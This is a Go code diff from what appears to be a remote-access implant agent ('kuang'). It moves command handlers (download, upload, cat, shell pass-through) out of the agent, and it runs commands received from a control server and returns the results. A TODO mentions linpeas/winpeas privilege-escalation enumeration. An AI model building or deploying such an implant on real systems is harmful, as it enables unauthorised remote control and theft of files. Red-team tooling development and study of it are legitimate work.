@@ -5,28 +5,20 @@ import (
 	"strings"
 	"time"
 
-	"konstantinovitz.com/kuang/internal/utils"
+	"konstantinovitz.com/kuang/internal/commands"
 )
 
 type Agent struct {
 	Transport      AgentTransport
 	MaxRetries     int
 	BaseDelay      time.Duration
-	CommandManager utils.CommandManager
+	CommandManager *commands.CommandManager
 }
 
 func (agent *Agent) Start() error {
-	// TODO: detect OS and build correct CommandManager, ie. sysenum command runs lipeas on linux and winpeas on windows
-	// TODO: note that this will increase the binary size compared to totally separate linux and windows builds, but who cares??
-	agent.CommandManager.RegisterHandler("ping", handlePing)
-	agent.CommandManager.RegisterHandler("download", handleDownloadFile)
-	agent.CommandManager.RegisterHandler("upload", handleUploadFile)
-	agent.CommandManager.RegisterHandler("cd", handleChangeDir)
-	agent.CommandManager.RegisterHandler("cat", handleCat)
-	agent.CommandManager.RegisterDefaultHandler(handleShellPassThrough)
-
 	retries := 0
 	for {
+		// TODO: migrate to Transport.Connnect
 		err := agent.Transport.Connect()
 		if err != nil {
 			if retries >= agent.MaxRetries {
@@ -56,11 +48,8 @@ func (agent *Agent) REPL() {
 		fmt.Println("Received command:", command)
 
 		cmdSlice := strings.Split(command, " ")
-		if len(cmdSlice) == 1 {
-			cmdSlice = append(cmdSlice, cmdSlice[0])
-		}
 
-		res, err := agent.CommandManager.HandleCommand(cmdSlice[0], cmdSlice...)
+		res, err := agent.CommandManager.HandleCommand(cmdSlice[0], cmdSlice[1:]...) // TODO: what if command slice length < 2?
 		// TODO: make the agent correctly write erorr messages back to the server
 
 		// Send the response back using the transport
